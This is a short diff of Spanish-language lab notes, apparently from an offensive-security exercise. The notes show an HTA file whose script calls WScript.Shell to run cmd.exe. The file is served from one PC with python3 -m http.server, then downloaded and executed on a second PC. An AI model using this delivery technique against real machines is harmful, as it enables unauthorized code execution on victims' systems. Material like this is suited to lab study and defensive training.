@@ -15,5 +15,5 @@ ActiveXObject('WScript.Shell').Run('cmd.exe')
 
 ++ PC1: Guardar el archivo como .hta
 ++ PC1: python3 -m http.server 8080
-++ PC2: Usando un navegador web colocar la ip de PC1 para acceder al servidor y descargar el archivo .hta
+++ PC2: Usando un navegador web colocar la ip de PC1 <ip:8080> para acceder al servidor y descargar el archivo .hta
 ++ PC2: Ejecutar el archivo .hta
